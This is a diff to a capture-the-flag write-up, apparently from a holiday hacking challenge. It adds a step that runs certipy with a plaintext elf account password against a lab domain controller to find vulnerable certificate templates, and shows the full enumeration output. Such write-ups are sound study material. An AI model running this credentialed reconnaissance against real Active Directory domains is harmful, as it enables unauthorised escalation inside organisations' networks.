@@ -801,5 +801,43 @@ alabaster@ssh-server-vm:~/impacket$ cat todo.txt
 3. Profit
 ````
  Next task would be to get access to **C:\FileShare\super_secret_research** 
+
+ Remember the task Reportinator where it says there is a ADCS vulnerability in the AD Environment, we will explore that. Since we have the certipy already present in Alabaster host we will use it to find if there are any 
+  
+````
+alabaster@ssh-server-vm:~/impacket$ certipy find -vulnerable -u elfy -p J4\`ufC49/J4766 -dc-ip 10.0.0.53 -debug
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Authenticating to LDAP server
+[+] Bound to ldaps://10.0.0.53:636 - ssl
+[+] Default path: DC=northpole,DC=local
+[+] Configuration path: CN=Configuration,DC=northpole,DC=local
+[+] Adding Domain Computers to list of current user's SIDs
+[+] List of current user's SIDs:
+     NORTHPOLE.LOCAL\Domain Computers (S-1-5-21-1242573302-2981867581-2555354284-515)
+     NORTHPOLE.LOCAL\Users (NORTHPOLE.LOCAL-S-1-5-32-545)
+     NORTHPOLE.LOCAL\Everyone (NORTHPOLE.LOCAL-S-1-1-0)
+     NORTHPOLE.LOCAL\Domain Users (S-1-5-21-1242573302-2981867581-2555354284-513)
+     NORTHPOLE.LOCAL\Authenticated Users (NORTHPOLE.LOCAL-S-1-5-11)
+     NORTHPOLE.LOCAL\elfy (S-1-5-21-1242573302-2981867581-2555354284-1104)
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[+] Trying to resolve 'npdc01.northpole.local' at '10.0.0.53'
+[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA
+[+] Trying to get DCOM connection for: 10.0.0.53
+[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[+] Connected to remote registry at 'npdc01.northpole.local' (10.0.0.53)
+[*] Got CA configuration for 'northpole-npdc01-CA'
+[+] Resolved 'npdc01.northpole.local' from cache: 10.0.0.53
+[+] Connecting to 10.0.0.53:80
+[*] Saved BloodHound data to '20240118082058_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20240118082058_Certipy.txt'
+[*] Saved JSON output to '20240118082058_Certipy.json'
+````
  
 </details>
